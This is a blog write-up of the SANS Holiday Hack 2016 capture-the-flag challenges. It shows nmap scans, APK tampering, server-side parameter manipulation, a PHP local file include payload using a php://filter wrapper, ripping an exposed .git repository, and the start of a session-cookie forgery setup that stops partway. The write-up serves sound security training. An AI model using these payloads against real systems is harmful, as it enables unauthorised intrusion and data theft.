---
title:  "Part 4: My Gosh... It's Full of Holes"
search: true
excerpt: "SANS Holiday Hack 2016 Writeup - The Challenges - Part 4"
header:
  #image: /assets/images/foo-bar-identity.jpg
  teaser: /assets/images/sans-2016.png
categories:
  - SANS
  - Holday Hack
  - writeup
classes: wide
last_modified_at: 2016-03-06T19:56:50+01:00
---

Question 7: ONCE YOU GET APPROVAL OF GIVEN IN-SCOPE TARGET IP ADDRESSES FROM TOM HESSMAN AT THE NORTH POLE, ATTEMPT TO REMOTELY EXPLOIT EACH OF THE FOLLOWING TARGETS... For each of those six items, which vulnerabilities did you discover and exploit?
{: .notice--danger}

Question 8: What are the names of the audio files you discovered from each system above? There are a total of SEVEN audio files (one from the original APK in Question 4, plus one for each of the six items in the bullet list above.) 
{: .notice--danger}

Below is the list of the six (6) vulnerable servers to target. Each hosting a hidden 'discombobulatedaudio' MP3 file.

|Target| IP Address | DNS |
|:------------- |:-------------:|-------------:| 
|The Mobile Analytics Server (via credentialed login access) | 104.198.252.157 | analytics.northpolewonderland.com |
|The Mobile Analytics Server (post authentication)| 104.198.252.157 | analytics.northpolewonderland.com |
|The Dungeon Game | 35.184.47.139 | dungeon.northpolewonderland.com |
|The Debug Server | 35.184.63.245 | dev.northpolewonderland.com |
|The Banner Ad Server | 104.198.221.240 | ads.northpolewonderland.com |
|The Uncaught Exception Handler Server | 104.154.196.33 | ex.northpolewonderland.com |

All target servers were discovered within the same file inside the SantaGram APK file.




### The Dungeon Game	

One of the elves (Pepper Minstix) provides a link to an [offline version](https://www.northpolewonderland.com/dungeon.zip) of the game 'Dungeon'.  A text based adventure game created at the Programming Technology Division of the MIT Laboratory for Computer Science.  It also goes by the name 'Zork'.

Extracting the ZIP file reveals two (2) files. 

- Linux ELF executable (dungeon)
- DAT file (dtextc.dat)

After some research, it seemed that all the good stuff was stored in the DAT file.  Running `strings` didn't turn up anything useful on either file.  A [Google search](https://www.google.com/search?num=100&q=decode+dungeon+dtextc.dat&oq=decode+dungeon+dtextc.dat) revealed that there was a way to decode the dtextc.dat file.

[http://web.mit.edu/jhawk/src/cdungeon-decode.c](http://web.mit.edu/jhawk/src/cdungeon-decode.c)

```yaml
josh@MacBook-Pro ~/Downloads $ curl -O http://web.mit.edu/jhawk/src/cdungeon-decode.c
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 70303  100 70303    0     0  69473      0  0:00:01  0:00:01 --:--:-- 69538

josh@MacBook-Pro ~/Downloads $ gcc cdungeon-decode.c -o cdungeon-decode  # A few warnings were generated but it still compiled.
```

Running the decode script...
```yaml
josh@MacBook-Pro ~/Downloads $ ./cdungeon-decode
Copyright (c) Ian Lance Taylor 1991 <ian@airs.com>
Usage: data -[aobn] [inputfile(s)] -[aobns] [outputfile(s)]
       -a ASCII (readable) format; one file
          input default stdin, output default stdout
       -o old (f77) format; index file, text file
          input default library files, output default local files
       -b new compressed binary format; one file
          input default library file, output default local file
       -n is a synonym for -b
       -s creates a sequential file (Alpha Micro only)
```
Feeding it the .dat file and specifying the output text file...

```yaml
josh@MacBook-Pro ~/Downloads $ ./cdungeon-decode -n dungeon/dtextc.dat -a dungeon/dtextc.txt
```
Searching for the text `elf` within the new text file... 

```yaml
josh@MacBook-Pro ~/Downloads $ cat dungeon/dtextc.txt | grep -i -A1 -B1 'elf'
<!--OUTPUT TRUNCATED-->
Message: 1023
 The elf, willing to bargain, says "What's in it for me?"
Message: 1024
--
--
Message: 1024
 The elf, satisified with the trade says -
 Try the online version for the true prize
--
--
Message: 1026
 The elf appears increasingly impatient.
Message: 1027
--
--
Message: 1027
 The elf says - you have conquered this challenge - the game will now end.
```

Looks like `Message: 1024` would hold the information needed, but it says to "try the online version."  There is also a Debug Mode (GDT) for this game per [http://gunkies.org/wiki/Zork_hints](http://gunkies.org/wiki/Zork_hints).  Using the GDT mode can take me right to the message I want to see using the `TD` command to 'Display Text'.

Time to see what ports are open on this host.  A quick `nmap` scan with service detection (-sV) hitting all TCP ports (-p-) should tell us more. Out of habit, I also save the results locally (-oA). This saves the output in the three major formats (.xml, .gnmap, and .nmap) at once.

```yaml
josh@MacBook-Pro ~/Downloads $ nmap -sV -p- dungeon.northpolewonderland.com -oA dungeon.northpolewonderland.com

Starting Nmap 7.31 ( https://nmap.org ) at 2016-12-24 12:24 EST
Nmap scan report for dungeon.northpolewonderland.com (35.184.47.139)
Host is up (0.047s latency).
rDNS record for 35.184.47.139: 139.47.184.35.bc.googleusercontent.com
Not shown: 65531 closed ports
PORT      STATE    SERVICE    VERSION
22/tcp    open     ssh        OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
25/tcp    filtered smtp
80/tcp    open     http       nginx 1.6.2
11111/tcp open     tcpwrapped
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.91 seconds
```

`TCP 11111` looks interesting.  Let's netcat to that port.

```yaml
josh@MacBook-Pro ~/Downloads/dungeon $ nc dungeon.northpolewonderland.com 11111
Welcome to Dungeon.			This version created 11-MAR-78.
You are in an open field west of a big white house with a boarded
front door.
There is a small wrapped mailbox here.
>GDT   
GDT>DT
Entry:    1024
The elf, satisified with the trade says -
send email to "peppermint@northpolewonderland.com" for that which you seek.
```

Next, I sent an e-mail off to `peppermint@northpolewonderland.com` and moments later, receive the following automated response...

![email_response](/assets/images/sans2016/email_response.png)

> The Dungeon Game challenge is complete!





### The Banner Ad Server

At first glance, `http://ads.northpolewonderland.com` seems to be a basic webpage without much going on.  

![banner_AD1](/assets/images/sans2016/ad_site2.png)

Viewing the page source discloses that the site is using Meteor release version `METEOR@1.4.2.3`,  which was released on November 17, 2016 according to the [GitHub release timeline](https://github.com/meteor/meteor/releases).

![banner_AD_source](/assets/images/sans2016/ad_pagesource.png)

Luckily, there was a recent SANS blog post titled [Mining Meteor](https://pen-testing.sans.org/blog/2016/12/06/mining-meteor).  Following the guidance in that post, I installed the [TamperMonkey](https://tampermonkey.net) add-on in Firefox and setup the [MeteorMiner](https://github.com/nidem/MeteorMiner) script to help visualize the active subscriptions and the collections for Meteor.

Firefox's browser developer tools (specifically the web console) will help with this challenge tremendously.

Now that the `TamperMonkey` with the `MeteorMiner` script was active, I'll load the page again.  The default pages shows 4 records under `HomeQuotes` under `Collections` (1). 

![banner_AD2](/assets/images/sans2016/ad_4_HomeQuotes.png)

It's also worth noting that the [MeteorMiner](https://github.com/nidem/MeteorMiner) script helps identify pages that would not have been accessible otherwise. The pages were listed under `Routes`.  Click the arrow to the right of `/admin/quotes` (1) and that will take you to the `/admin/quotes` page.  

While there may not be anything useful displayed on the page, a new record appeared within the `HomeQuotes` (2) section under `Collections`.

![banner_AD3](/assets/images/sans2016/ad_5_HomeQuotes.png)

To see everything that's included within `adminQuotes`, open the Firefox web console (from the keyboard: press Ctrl+Shift+K or Cmd+Option+K on a Mac)

With the web console open, type `HomeQuotes.find().fetch()` then press enter to display all the objects (1).  Click on the fifth object (2) to see the link to the the audio file (3).

![banner_AD_flag](/assets/images/sans2016/ad_site_audiofile.png)

Thanks to `MeteorMiner`, the collections information was visible and I knew exactly what to query from within the Firefox web console.

`http://ads.northpolewonderland.com/ofdAR4UYRaeNxMg/discombobulatedaudio5.mp3`

> Banner Ad Server complete!





### The Debug Server

Completing the Debug Server challenge required changing the APK file.  By default, debug mode on the StantaGram app is disabled.  In [Part 2](/challenges/#part-2-awesome-package-konveyance), I covered how to extract an APK file with [apktool](https://ibotpeaches.github.io/Apktool/). 

I'll pick up from already having the SantaGram app decompiled.

Let's do a case insensitive (-i), recursive (-r), `grep` command to see where the word `debug` appears in any files within the StantaGram_4.2 directory...

```yaml
josh@MacBook-Pro ~/HolidayHack2016/SantaGram_4.2 $ grep -i -r "debug" .
./res/values/public.xml:    <public type="string" name="debug_data_collection_url" id="0x7f07001d" />
./res/values/public.xml:    <public type="string" name="debug_data_enabled" id="0x7f07001e" />
./res/values/strings.xml:    <string name="debug_data_collection_url">http://dev.northpolewonderland.com/index.php</string>
./res/values/strings.xml:    <string name="debug_data_enabled">false</string>
./smali/android/support/v7/view/menu/h.smali:    .annotation runtime Landroid/view/ViewDebug$CapturedViewProperty;
./smali/android/support/v7/view/menu/h.smali:    .annotation runtime Landroid/view/ViewDebug$CapturedViewProperty;
./smali/android/support/v7/widget/ActionMenuView$c.smali:    .annotation runtime Landroid/view/ViewDebug$ExportedProperty;
./smali/android/support/v7/widget/ActionMenuView$c.smali:    .annotation runtime Landroid/view/ViewDebug$ExportedProperty;
./smali/android/support/v7/widget/ActionMenuView$c.smali:    .annotation runtime Landroid/view/ViewDebug$ExportedProperty;
./smali/android/support/v7/widget/ActionMenuView$c.smali:    .annotation runtime Landroid/view/ViewDebug$ExportedProperty;
./smali/android/support/v7/widget/ActionMenuView$c.smali:    .annotation runtime Landroid/view/ViewDebug$ExportedProperty;
./smali/com/northpolewonderland/santagram/b.smali:    invoke-static {}, Landroid/os/Debug;->getNativeHeapAllocatedSize()J
./smali/com/northpolewonderland/santagram/EditProfile.smali:    const-string v3, "Remote debug logging is Enabled"
./smali/com/northpolewonderland/santagram/EditProfile.smali:    const-string v1, "debug"
./smali/com/northpolewonderland/santagram/EditProfile.smali:    const-string v3, "Remote debug logging is Disabled"
./smali/com/northpolewonderland/santagram/EditProfile.smali:    const-string v3, "Error posting JSON debug data: "
./smali/com/northpolewonderland/santagram/SplashScreen.smali:    invoke-static {}, Landroid/os/Debug;->getNativeHeapAllocatedSize()J
./smali/com/parse/Parse.smali:.field public static final LOG_LEVEL_DEBUG:I = 0x3
```

Of all the matches, the file `./res/values/strings.xml` looked promising.  The file was edited to change the `debug_data_enabled=false` to `true`. It's worth noting that the `EditProfile.smali` appears to check if debug mode is enabled or not.  Time to change the file, rebuild, then upload to the emulator. 

The APK rebuild process is covered very well in the [Manipulating Android Applications](https://www.youtube.com/watch?v=mo2yZVRicW0) video.  Watch this to understand how to setup your environment and how to sign the APK file.  

I also installed the Burp proxy certificate on the Android emulator.  To do this, follow the steps in [this post](https://support.portswigger.net/customer/portal/questions/12817785-how-to-use-burp-proxy-with-an-emulated-android-device-) from the PortSwigger support forum.

I wrote a quick bash script to automate the process of removing the APK from the emulator, building a new version, signing it, and reinstalling.

```yaml
josh@MacBook-Pro ~/HolidayHack2016 $ cat quick_apk.sh
#!/bin/bash

echo [*] Uninstalling APK
## Uninstall
'/Users/josh/Library/Android/sdk/platform-tools/adb' uninstall com.northpolewonderland.santagram

echo [*] Building new APK
## Build New APK
java -jar '/Users/josh/HolidayHack2016/apktool_2.2.1.jar' b SantaGram_4.2

echo [*] Signing new APK
## Sign New APK
'/Applications/Android Studio.app/Contents/jre/jdk/Contents/Home/bin/jarsigner' -sigalg SHA1withRSA -digestalg SHA1 -keystore /Users/josh/HolidayHack2016/keys/SantaGram.keystore /Users/josh/HolidayHack2016/SantaGram_4.2/dist/SantaGram_4.2.apk SantaGram

sleep 1

echo [*] Installing new APK
## Install New APK
'/Users/josh/Library/Android/sdk/platform-tools/adb' install /Users/josh/HolidayHack2016/SantaGram_4.2/dist/SantaGram_4.2.apk

echo [!] Complete
```

The updated APK with the modified `strings.xml` file has been loaded into the emulator.  Time to login to the app and visit the Edit Profile section.  

![debug1](/assets/images/sans2016/debug1.png)

Burp shows a POST request sent to `http://dev.northpolewonderland.com` after entering the Edit Profile section.  Let's select that request and send it to repeater to play with the JSON parameters. 

![debug1](/assets/images/sans2016/debug2.png)

The image above shows the original request and response.  The response includes `"verbose":false`, what if `"verbose":true` was included in the request?

![debug1](/assets/images/sans2016/debug3.png)

Look at that. Because the information being sent from the client (me) is not validated server side, I am able to view the verbose information which includes the debug audio file.  Ideally, if sensitive information is included in the verbose response, only approved specified users should be able to successfully request that information. 

```yaml
josh@MacBook-Pro ~/HolidayHack2016 $ curl -O http://dev.northpolewonderland.com/debug-20161224235959-0.mp3
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  212k  100  212k    0     0   743k      0 --:--:-- --:--:-- --:--:--  744k
josh@MacBook-Pro ~/HolidayHack2016 $ file debug-20161224235959-0.mp3
debug-20161224235959-0.mp3: Audio file with ID3 version 2.3.0, contains: MPEG ADTS, layer III, v1, 128 kbps, 44.1 kHz, JntStereo
```

> The Debug Server is complete!




### The Uncaught Exception Handler Server

Much like in the previous Debug Server challenge, finding the audio file within the Uncaught Exception Handler Server required going back into the SantaGram APK decompiled folder and making modifications to the source code of the app.  Most apps do not trigger exceptions (crashes) when using the app normally (at least you hope not). Let's make sure this app triggers an exception and watch what happens.

In [Part 2](/challenges/#part-2-awesome-package-konveyance), I covered how to extract an APK file with [apktool](https://ibotpeaches.github.io/Apktool/).   

I'll pick up from already having the SantaGram app decompiled. I already know from the Debug Server challenge that the `EditProfile.smali` file is called when pressing the Edit Profile button.  With this information, it is possible to tweak that file causing a targeted exception when the Edit Profile button is pressed.

```yaml
josh@MacBook-Pro ~/HolidayHack2016/SantaGram_4.2 $ grep -i "exception" ./smali/com/northpolewonderland/santagram/EditProfile.smali
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0
    move-exception v1
    invoke-virtual {v1}, Ljava/io/IOException;->printStackTrace()V
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    move-exception v0
    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;
```
A quick grep for the word `exception` within the EditProfile.smali file has some hits.  

```yaml
josh@MacBook-Pro ~/HolidayHack2016/SantaGram_4.2 $ grep -i "exception" ./smali/com/northpolewonderland/santagram/EditProfile.smali
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0
    move-exception v1
    invoke-virtual {v1}, Ljava/io/IOException;->printStackTrace()V
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    move-exception v0
    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;
```

The logic to catch an exception (if it should happen) is there, let's make sure it triggers.

```yaml
josh@MacBook-Pro ~/HolidayHack2016 $ vim ./smali/com/northpolewonderland/santagram/EditProfile.smali
<!--OUTPUT TRUNCATED-->
101     if-ne p1, v1, :cond_2
102
103     :try_start_0
104     invoke-virtual {p0}, Lcom/northpolewonderland/santagram/EditProfile;->getApplicationContext()Landroid/content/Context;
105
106     move-result-object v1
107
108     invoke-virtual {v1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;
109
110     move-result-object v1
111
112     invoke-virtual {p3}, Landroid/content/Intent;->getData()Landroid/net/Uri;
113
114      move-result-object v2    # Replacing with move-exception v1
115
116     invoke-static {v1, v2}, Landroid/provider/MediaStore$Images$Media;->getBitmap(Landroid/content/ContentResolver;Landroid/net/Uri;)Landroid/graphics/Bitmap;
117     :try_end_0
118     .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0
119
120     move-result-object v0
121
122     move-object v1, v0
123
124     goto :goto_0
125
126     :catch_0
127     move-exception v1
128
129     invoke-virtual {v1}, Ljava/io/IOException;->printStackTrace()V
130
131     :cond_2
132     move-object v1, v0
133
134     goto :goto_0
<!--OUTPUT TRUNCATED-->
```

Changing line number 114 in the `EditProfile.smali` file to be `move-exception v1` will cause the app to throw an exception after pressing the Edit Profile button.

![exception1](/assets/images/sans2016/crash_dump1.png)

From here,  take that POST request and send it to Repeater within Burp.

![exception1](/assets/images/sans2016/crash_dump2.png)

The POST request generated a crashdump file called `crashdump-aDjJbG.php`

![exception1](/assets/images/sans2016/crash_dump3.png)

When trying to fuzz the operation parameter, the error message displayed in the response discloses what the valid JSON keys are.  I already saw what the `WriteCrashDump` request looks like, let's see what the `ReadCrashDump` responds with...

![exception1](/assets/images/sans2016/crash_dump4.png)

Getting a little further.  Now it wants a `crashdump` key set. Might as well specify a crashdump file to read also, since I have the name of the file generated earlier.

![exception1](/assets/images/sans2016/crash_dump5.png)

So the .php extension is not required.  To solve the final part of this challenge requires having a way to pull a PHP file from the server.  A recent SANS blog post titled [Getting MOAR Value out of PHP Local File Include Vulnerabilities](https://pen-testing.sans.org/blog/2016/12/07/getting-moar-value-out-of-php-local-file-include-vulnerabilities) pointed me in the right direction. Specifically, I will be using a PHP wrapper to base64 encode the target file and then I can decode it easily.

![exception1](/assets/images/sans2016/crash_dump6.png)

Final payload `{"operation":"ReadCrashDump","data":{"crashdump":"php://filter/convert.base64-encode/resource=crashdump-aDjJbG"}}`

Saving the base64 encoded text to a file, then decoding it reveals the location of the audio file.

```yaml
josh@MacBook-Pro ~/HolidayHack2016/ $ cat exception_base64.txt| base64 -D > exception_decoded.txt
josh@MacBook-Pro ~/HolidayHack2016/ $ cat exception_decoded.txt
<?php

# Audio file from Discombobulator in webroot: discombobulated-audio-6-XyzE3N9YqKNH.mp3

# Code from http://thisinterestsme.com/receiving-json-post-data-via-php/
# Make sure that it is a POST request.
if(strcasecmp($_SERVER['REQUEST_METHOD'], 'POST') != 0){
    die("Request method must be POST\n");
}

# Make sure that the content type of the POST request has been set to application/json
$contentType = isset($_SERVER["CONTENT_TYPE"]) ? trim($_SERVER["CONTENT_TYPE"]) : '';
if(strcasecmp($contentType, 'application/json') != 0){
    die("Content type must be: application/json\n");
}

# Grab the raw POST. Necessary for JSON in particular.
$content = file_get_contents("php://input");
$obj = json_decode($content, true);
	# If json_decode failed, the JSON is invalid.
if(!is_array($obj)){
    die("POST contains invalid JSON!\n");
}

# Process the JSON.
if ( ! isset( $obj['operation']) or (
	$obj['operation'] !== "WriteCrashDump" and
	$obj['operation'] !== "ReadCrashDump"))
	{
	die("Fatal error! JSON key 'operation' must be set to WriteCrashDump or ReadCrashDump.\n");
}
if ( isset($obj['data'])) {
	if ($obj['operation'] === "WriteCrashDump") {
		# Write a new crash dump to disk
		processCrashDump($obj['data']);
	}
	elseif ($obj['operation'] === "ReadCrashDump") {
		# Read a crash dump back from disk
		readCrashdump($obj['data']);
	}
}
else {
	# data key unset
	die("Fatal error! JSON key 'data' must be set.\n");
}
function processCrashdump($crashdump) {
	$basepath = "/var/www/html/docs/";
	$outputfilename = tempnam($basepath, "crashdump-");
	unlink($outputfilename);

	$outputfilename = $outputfilename . ".php";
	$basename = basename($outputfilename);

	$crashdump_encoded = "<?php print('" . json_encode($crashdump, JSON_PRETTY_PRINT) . "');";
	file_put_contents($outputfilename, $crashdump_encoded);

	print <<<END
{
	"success" : true,
	"folder" : "docs",
	"crashdump" : "$basename"
}

END;
}
function readCrashdump($requestedCrashdump) {
	$basepath = "/var/www/html/docs/";
	chdir($basepath);

	if ( ! isset($requestedCrashdump['crashdump'])) {
		die("Fatal error! JSON key 'crashdump' must be set.\n");
	}

	if ( substr(strrchr($requestedCrashdump['crashdump'], "."), 1) === "php" ) {
		die("Fatal error! crashdump value duplicate '.php' extension detected.\n");
	}
	else {
		require($requestedCrashdump['crashdump'] . '.php');
	}
}

?>
```

Audio file location: http://ex.northpolewonderland.com/discombobulated-audio-6-XyzE3N9YqKNH.mp3


> The Uncaught Exception Handler Server is complete!





### The Mobile Analytics Server (via credentialed login access)

Using the credentials found during [Part 1: A Most Curious Business Card](/challenges/#part-1-a-most-curious-business-card) in the APK file, `guest` and `busyreindeer78` provided credentialed access to the login portal at `https://analytics.northpolewonderland.com`.

![analytics_site](/assets/images/sans2016/analytics_as_guest.png)

Once authenticated, simply click the [MP3 link](https://analytics.northpolewonderland.com/getaudio.php?id=20c216bc-b8b1-11e6-89e1-42010af00008) at the top to grab `discombobulatedaudio2.mp3`.

> The Mobile Analytics Server (via credentialed login access) is complete!






### The Mobile Analytics Server (post authentication)

Already knowing that I had the audio file for the authenticated `guest` account, there must be another area to attack on this server.  Another elf named "Minty Candycane" suggested using the nmap default scripts (-sC) flag to find extra files on web servers.  Let's give it a shot.

```yaml
josh@MacBook-Pro ~/HolidayHack2016 $ nmap -sC -p- analytics.northpolewonderland.com -oA analytics.northpolewonderland.com

Starting Nmap 7.31 ( https://nmap.org ) at 2016-12-24 13:32 EST
Nmap scan report for analytics.northpolewonderland.com (104.198.252.157)
Host is up (0.040s latency).
rDNS record for 104.198.252.157: 157.252.198.104.bc.googleusercontent.com
Not shown: 65533 filtered ports
PORT    STATE SERVICE
22/tcp  open  ssh
| ssh-hostkey:
|   1024 5d:5c:37:9c:67:c2:40:94:b0:0c:80:63:d4:ea:80:ae (DSA)
|   2048 f2:25:e1:9f:ff:fd:e3:6e:94:c6:76:fb:71:01:e3:eb (RSA)
|_  256 4c:04:e4:25:7f:a1:0b:8c:12:3c:58:32:0f:dc:51:bd (ECDSA)
443/tcp open  https
| http-git:
|   104.198.252.157:443/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Finishing touches (style, css, etc)
| http-title: Sprusage Usage Reporter!
|_Requested resource was login.php
| ssl-cert: Subject: commonName=analytics.northpolewonderland.com
| Subject Alternative Name: DNS:analytics.northpolewonderland.com
| Not valid before: 2016-12-07T17:35:00
|_Not valid after:  2017-03-07T17:35:00
|_ssl-date: ERROR: Script execution failed (use -d to debug)
| tls-nextprotoneg:
|_  http/1.1

Nmap done: 1 IP address (1 host up) scanned in 125.65 seconds
```

A Git repository found! To clone the repository locally, I used [dvcs-ripper](https://github.com/kost/dvcs-ripper).  Just clone the dvcs-ripper repo, install any missing requirements and point rip-git.pl at the .git directory. Will also need to ignore SSL certification verification (with -s).

```
josh@MacBook-Pro /opt/dvcs-ripper (master*) $ ./rip-git.pl -s -v -u 'https://analytics.northpolewonderland.com/.git/'
[i] Downloading git files from https://analytics.northpolewonderland.com/.git/
[i] Auto-detecting 404 as 200 with 3 requests
[i] Getting correct 404 responses
[i] Using session name: MtvKvTOc
[d] found COMMIT_EDITMSG
[d] found config
[d] found description
[d] found HEAD
[d] found index
[!] Not found for packed-refs: 404 Not Found
[!] Not found for objects/info/alternates: 404 Not Found
[!] Not found for info/grafts: 404 Not Found
[d] found logs/HEAD
[d] found objects/d6/3a7e0df35ad525fa40eceae67be5b27215ece8
[d] found objects/10/57b70e7681f44aac2789e26a2b714327d8c203
[d] found objects/bb/2646691fc9f6bf5f1a0ade746b28f8147ffa48
[d] found objects/42/0f433fe33d14abac5c3a588c3e753d0d71d50d
[d] found objects/5f/0c135e1479d865945577c0a70d0cf39e49cdc7
[d] found objects/d9/636a3d648e617fcb92055dea63ac2469f67c84
[d] found objects/f0/d28ed3cc39538a6c415789408ef3f24ded959c
[d] found objects/02/e8d14ffa8910bfd5365ff36eb96bcd7efc4409
[d] found objects/6a/b9fe6ec3de2e28b79108ff5110643e9ba32478
[d] found objects/cf/5f27b161f53d62f97ad6ebc648701288a2ea89
[d] found objects/26/89a45ab9c38d92675660b9113fc173a0ccf129
[d] found objects/25/9d406f3f2345b50338d54a53efa36dd08f6f20
[d] found objects/15/62064538562f077d388044e344e3c2d85450d7
[d] found objects/07/78ac7de1d7ff8ae46ebabdee33a340ab9506f3
[d] found objects/19/08b71d42bce15345cabb7a63f57b5c79b85d15
[d] found objects/43/970092ea851cff05e44aba3e0a67eb351304f3
[d] found objects/58/c900fd53fced0d588e00e23c26cb8465eed498
[d] found objects/88/5ec6a4e870ce983aecde3a4f0e398b6a76615f
[d] found objects/45/edadc1850c3894ab8850d1d77dca9a074a3a6a
[d] found objects/85/a4207c178fa0f9c6b6bb77a6d42eac487159c0
[d] found objects/62/547860f9a6e0f3a3bdfd3f9b14fea3ac7f7c31
[d] found objects/93/5d79726e13ab65c3b5baa4d925de86059057d4
[d] found objects/e4/6b41e391ee0e9f4afab7880982501ac1471fb4
[d] found objects/10/6079e728c97ebea387042a2e076fab62952e1e
[d] found objects/16/ae0cbe2630a87c0470b9a864bf048e813826db
[d] found refs/heads/master
[i] Running git fsck to check for missing items
Checking object directories: 100% (256/256), done.
Checking objects: 100% (139/139), done.
[i] Got items with git fsck: 0, Items fetched: 0
[!] No more items to fetch. That's it!
```

Time to see what was pulled down...

```yaml
josh@MacBook-Pro /opt/dvcs-ripper (master*) $ ls -la
total 304
drwxr-xr-x  33 josh  wheel   1122 Dec 29 13:52 .
drwxr-xr-x@ 22 josh  wheel    748 Dec 26 09:31 ..
drwxr-xr-x  14 josh  wheel    476 Dec 29 13:56 .git
-rw-r--r--   1 josh  wheel    149 Dec 16 20:58 .gitignore
-rw-r--r--   1 josh  wheel  18027 Dec 16 20:58 LICENSE
-rw-r--r--   1 josh  wheel    310 Dec 29 13:52 README.md
drwxr-xr-x   2 josh  wheel     68 Dec 29 13:45 captured
-rw-r--r--   1 josh  wheel    290 Dec 29 13:52 crypto.php
drwxr-xr-x  11 josh  wheel    374 Dec 29 13:52 css
-rw-r--r--   1 josh  wheel   2958 Dec 29 13:52 db.php
-rw-r--r--   1 josh  wheel   2392 Dec 29 13:52 edit.php
drwxr-xr-x   7 josh  wheel    238 Dec 29 13:52 fonts
-rw-r--r--   1 josh  wheel     29 Dec 29 13:52 footer.php
-rw-r--r--   1 josh  wheel   1191 Dec 29 13:52 getaudio.php
-rw-r--r--   1 josh  wheel   2000 Dec 29 13:52 header.php
-rw-r--r--   1 josh  wheel    819 Dec 29 13:52 index.php
drwxr-xr-x   5 josh  wheel    170 Dec 29 13:52 js
-rw-r--r--   1 josh  wheel   2913 Dec 29 13:52 login.php
-rw-r--r--   1 josh  wheel    174 Dec 29 13:52 logout.php
-rw-r--r--   1 josh  wheel    325 Dec 29 13:52 mp3.php
-rw-r--r--   1 josh  wheel   7697 Dec 29 13:52 query.php
-rw-r--r--   1 josh  wheel   2252 Dec 29 13:52 report.php
-rwxr-xr-x   1 josh  wheel   6401 Dec 16 20:58 rip-bzr.pl
-rwxr-xr-x   1 josh  wheel   4718 Dec 16 20:58 rip-cvs.pl
-rwxr-xr-x   1 josh  wheel  15114 Dec 16 20:58 rip-git.pl
-rwxr-xr-x   1 josh  wheel   6102 Dec 16 20:58 rip-hg.pl
-rwxr-xr-x   1 josh  wheel   6157 Dec 16 20:58 rip-svn.pl
-rw-r--r--   1 josh  wheel   5008 Dec 29 13:52 sprusage.sql
drwxr-xr-x   6 josh  wheel    204 Dec 29 13:52 test
-rw-r--r--   1 josh  wheel    629 Dec 29 13:52 this_is_html.php
-rw-r--r--   1 josh  wheel    739 Dec 29 13:52 this_is_json.php
-rw-r--r--   1 josh  wheel    647 Dec 29 13:52 uuid.php
-rw-r--r--   1 josh  wheel   1949 Dec 29 13:52 view.php
```

Taking a look at the `header.php` file revealed that there was also an `administrator` user and they were the only one allowed to view `edit.php`.

```yaml
josh@MacBook-Pro /opt/dvcs-ripper (master*) $ cat header.php
<!--OUTPUT TRUNCATED-->
        <div class="navbar-collapse collapse" id="navbar-main">
          <ul class="nav navbar-nav">
            <li><a href="/query.php">Query</a></li>
            <li><a href="/view.php">View</a></li>
            <?php
              if (get_username() == 'guest') {
                ?>
                  <li><a href="/<?= mp3_web_path($db); ?>">MP3</a></li>
                <?php
              }
              if (get_username() == 'administrator') {
                ?>
                  <li><a href="/edit.php">Edit</a></li>
                <?php
              }
            ?>
          </ul>
<!--OUTPUT TRUNCATED-->
```
The next question you may be asking yourself is, "How do I get the password for the administrator account?"  At this point, you can't.  However, without a password, how else can you control another user's authenticated session? 

The answer is at the bottom of `login.php`.

```yaml
josh@MacBook-Pro /opt/dvcs-ripper (master*) $ cat login.php
<!--OUTPUT TRUNCATED-->
EOF;
  } else {
    require_once('db.php');

    check_user($db, $_POST['username'], $_POST['password']);

    print "Successfully logged in!";

    $auth = encrypt(json_encode([
      'username' => $_POST['username'],
      'date' => date(DateTime::ISO8601),
    ]));

    setcookie('AUTH', bin2hex($auth));

    header('Location: index.php?msg=Successfully%20logged%20in!');
  }
?>
```
The code above describes how session cookies are generated.  I wondered if it was possible to host this application locally and modify this code to bypass the validation associated with `check_user`.   This is exactly what can be done because the .git repository had the .sql file. 

Time to switch back over to the Kali VM to host the MySQL database and use Apache to serve the PHP files.  The `README.md` included in the .git repo describes what is needed.

```yaml
root@gh0st1:/var/www/html# cat README.md
# Installation
* Install Linux/ApachePHP/MySQL (this should work fine under nginx and other systems)
** Make sure you install `php-mysql` and `php-mcrypt`
* Create a database using `sprusage.sql`
** Create a MySQL user with full access to that database, and put its account in the variables on top of `db.php`
```
Before importing the `sprusage.sql` file, a database has to be created for it first.

```yaml
root@gh0st1:/var/www/html# mysql
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 39140
Server version: 5.6.30-1 (Debian)

Copyright (c) 2000, 2016, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> CREATE DATABASE sprusage;
Query OK, 1 row affected (0.04 sec)

mysql> EXIT;
Bye
```
Now to import the .sql file...

One little note to add here, line 151 in sprusage.sql was actually missing a closing quote after localhost.

Original:
```GRANT SELECT, INSERT, UPDATE ON `sprusage`.`app_usage_reports` TO 'sprusage'@'localhost;```

Modified:
```GRANT SELECT, INSERT, UPDATE ON `sprusage`.`app_usage_reports` TO 'sprusage'@'localhost';```

With that update made, sprusage.sql will import successfully. 

```yaml
root@gh0st1:/var/www/html# mysql -u root sprusage < sprusage.sql
```

Finally, a user has to be created.  The username and password already in use in the db.php is `sprusage` with no password set.  That will have to be updated. 

```yaml
mysql> USE sprusage;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> CREATE USER 'sprusage'@'localhost' IDENTIFIED BY 'SANS2016';
Query OK, 0 rows affected (0.00 sec)

